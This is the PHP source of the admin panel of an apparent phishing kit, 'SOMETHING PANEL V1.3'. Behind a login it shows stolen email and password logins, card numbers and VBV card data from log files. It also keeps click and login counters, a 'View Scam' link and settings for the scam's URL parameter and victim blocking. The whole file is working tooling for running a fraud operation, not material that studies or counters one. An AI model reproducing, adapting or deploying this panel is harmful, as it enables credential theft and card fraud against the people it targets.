<?php
/* 
 _____  ________  ___ _____ _____ _   _ _____ _   _ _____    ___  ___  ___  ___   ___________ _   _   _____ _____   ___  ___  ___  ___  
/  ___||  _  |  \/  ||  ___|_   _| | | |_   _| \ | |  __ \  / _ \ |  \/  | / _ \ |___  /  _  | \ | | /  ___/  __ \ / _ \ |  \/  | / _ \ 
\ `--. | | | | .  . || |__   | | | |_| | | | |  \| | |  \/ / /_\ \| .  . |/ /_\ \   / /| | | |  \| | \ `--.| /  \// /_\ \| .  . |/ /_\ \
 `--. \| | | | |\/| ||  __|  | | |  _  | | | | . ` | | __  |  _  || |\/| ||  _  |  / / | | | | . ` |  `--. \ |    |  _  || |\/| ||  _  |
/\__/ /\ \_/ / |  | || |___  | | | | | |_| |_| |\  | |_\ \ | | | || |  | || | | |./ /__\ \_/ / |\  | /\__/ / \__/\| | | || |  | || | | |
\____/  \___/\_|  |_/\____/  \_/ \_| |_/\___/\_| \_/\____/ \_| |_/\_|  |_/\_| |_/\_____/\___/\_| \_/ \____/ \____/\_| |_/\_|  |_/\_| |_/
                                                                                                                                        
                                                                                                                                        
*/
ob_start();
session_start();
ob_end_clean();
require_once "../config.php";
if(!isset($_SESSION['username'])){
header("location:login.php");
exit;
}
?>
<html>
<head>
	<title>SOMETHING PANEL V1.3</title>
	<link href="//brobin.github.io/hacker-bootstrap/css/hacker.css" rel="stylesheet">
  <link href="img/something-ico.png" rel="icon" type="image/x-icon" />
</head>
   <style>
    .tall-row {
        margin-top: 40px;
    }
    .modal {
        position: relative;
        top: auto;
        right: auto;
        left: auto;
        bottom: auto;
        z-index: 1;
        display: block;
    }
    .transparan{
        background:transparent;
        opacity:0.4;
    }
    </style>
</head>
<body>

    <nav class="navbar navbar-default navbar-static-top">
        <div class="container">
            <div class="navbar-header">
                <a class="navbar-brand" href="#"><img src="img/something-logo.png" width="180"></a>
                </div>
            <div id="navbar" class="navbar-collapse collapse">
                <ul class="nav navbar-nav navbar-right">
                    <li>
                        <a href="https://<?php echo $_SERVER['SERVER_NAME']."/?".$param;?>" target="_blank">View Scam</a>
                    </li>
                    <li>
                        <a href="https://www.facebook.com/founder.agility" target="_blank">Contact Provider</a>
                    </li>
                    <li>
                        <a href="logout.php">Logout</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>
    <marquee behavior="alternate" onmouseover="this.stop()" onmouseout="this.start()"><h4 style="font-family:verdana;">
<script type='text/javascript'>
//<![CDATA[

var text="Welcome To SOMETHING PANEL V1.3" //Ganti dengan teks anda
var speed=80 //Kecepatan ganti warna

if (document.all||document.getElementById){
document.write('<span id="highlight">' + text + '</span>')
var storetext=document.getElementById? document.getElementById("highlight") : document.all.highlight
}
else
document.write(text)
var hex=new Array("00","14","28","3C","50","64","78","8C","A0","B4","C8","DC","F0")
var r=1
var g=1
var b=1
var seq=1
function changetext(){
rainbow="#"+hex[r]+hex[g]+hex[b]
storetext.style.color=rainbow
}
function change(){
if (seq==6){
b--
if (b==0)
seq=1
}
if (seq==5){
r++
if (r==12)
seq=6
}
if (seq==4){
g--
if (g==0)
seq=5
}
if (seq==3){
b++
if (b==12)
seq=4
}
if (seq==2){
r--
if (r==0)
seq=3
}
if (seq==1){
g++
if (g==12)
seq=2
}
changetext()
}
function starteffect(){
if (document.all||document.getElementById)
flash=setInterval("change()",speed)
}
starteffect()

//]]>
</script></h4></marquee>
    <div class="container">
        <div class="row">
                         <div class="col-lg-6">
                <div class="well">
                    <form class="form-horizontal">
                        <fieldset>
                            <legend>Track</legend>
                            <div class="form-group">
                                <div class="col-lg-12">
                                    <div class="transparan">
                                    <textarea style="margin: 0px; width: 514px; height: 94px;" readonly="true"><?php echo @file_get_contents("../logs/some-log.txt"); ?></textarea>
                                </div>
                            </div>
                            </div>
                    </form>
                </div>
            </div>
            <div class="col-lg-6">
                <div class="well">
                        <fieldset>
<legend>Email & Setting Configuration</legend>
<form action="./update.php" method="post">
<div class="field">
  <input name="updateType" type="hidden" value="1">
  <div class="input-group">
        <span class="input-group-addon"><?php echo $Your_Email; ?></span>
        <input type="email" class="form-control" name="Your_Email" placeholder="New Email" required>
        <span class="input-group-btn">
        <button class="btn btn-default" id="submit">Change</button>
        </span>
        </div>
        </div>
        </form>
<form action="./update.php" method="post">
<div class="field">
  <input name="updateType" type="hidden" value="2">
  <div class="input-group">
        <span class="input-group-addon"><?php echo $Password; ?></span>
        <input type="text" class="form-control" name="panelPassword" placeholder="New Password" pattern=".{5,}" required>
        <span class="input-group-btn">
        <button class="btn btn-default" id="submit">Change</button>
        </span>
        </div>
</div>
</form>
<form action="./update.php" method="post">
<div class="field">
  <input name="updateType" type="hidden" value="3">
  <div class="input-group">
        <span class="input-group-addon"><?php echo $param; ?></span>
        <input type="text" class="form-control" name="param" placeholder="New Param" required>
        <span class="input-group-btn">
        <button class="btn btn-default" id="submit">Change</button>
        </span>
        </div>
</div>
</form>
<form action="./update.php" method="post">
<div class="field">
  <input name="updateType" type="hidden" value="4">
  <div class="input-group">
        <span class="input-group-addon"><?php echo $One_Time_Access; ?></span>
        <input type="text" class="form-control" name="One_Time_Access" placeholder="block / non" required>
        <span class="input-group-btn">
        <button class="btn btn-default" id="submit">Change</button>
        </span>
        </div>
</div>
</form>
</div>
</div>
             <div class="col-lg-6">
                <div class="well">
                    <form class="form-horizontal">
                        <fieldset>
                            <legend>Email & Password Login</legend>
                            <div class="form-group">
                                <div class="col-lg-12">
                                    <div class="transparan">
                                     <form name="copy"><div align="right"><input onclick="javascript:this.form.txt.focus();this.form.txt.select();" type="button" value="Select All"></div>
                                    <textarea style="margin: 0px; width: 514px; height: 94px;" name="txt" readonly="true"><?php echo @file_get_contents("../logs/some-acc.log"); ?></textarea>
                                    </font>
                                </div>
                            </div>
                            </div>
                    </form>
                </div>
            </div>
                         <div class="col-lg-6">
                <div class="well">
                    <form class="form-horizontal">
                        <fieldset>
                            <legend>Bin List</legend>
                            <div class="form-group">
                                <div class="col-lg-12">
                                    <div class="transparan">
                                        <form name="copy"><div align="right"><input onclick="javascript:this.form.txt.focus();this.form.txt.select();" type="button" value="Select All"></div>
                                    <textarea style="margin: 0px; width: 514px; height: 94px;" name="txt" readonly="true"><?php echo @file_get_contents("../logs/some-cc.log"); ?></textarea>
                                </div>
                            </div>
                            </div>
                    </form>
                </div>
            </div>
</div>
<button class="btn btn-danger">Click <span class="badge"><?php echo empty(@file_get_contents("../logs/some-click.txt")) ? "0" : @file_get_contents("../logs/some-click.txt"); ?></span></a></button>
<button class="btn btn-warning">Login <span class="badge"><?php echo empty(@file_get_contents("../logs/some-login.txt")) ? "0" : @file_get_contents("../logs/some-login.txt"); ?></span></a></button>
<button class="btn btn-primary">CC <span class="badge"><?php echo empty(@file_get_contents("../logs/some-cc.txt")) ? "0" : @file_get_contents("../logs/some-cc.txt"); ?></span></a></button>
<button class="btn btn-default">VBV CC <span class="badge"><?php echo empty(@file_get_contents("../logs/some-vbvmsc.txt")) ? "0" : @file_get_contents("../logs/some-vbvmsc.txt"); ?></span></a></button>
<button class="btn btn-default"><a href="clear.php?file=clearAll">Clear Log ?</a></button>
<br>
Created by <a href="https://www.facebook.com/founder.agility">Febriyanto Hamonangan</a>. © 2018

</body>
</html>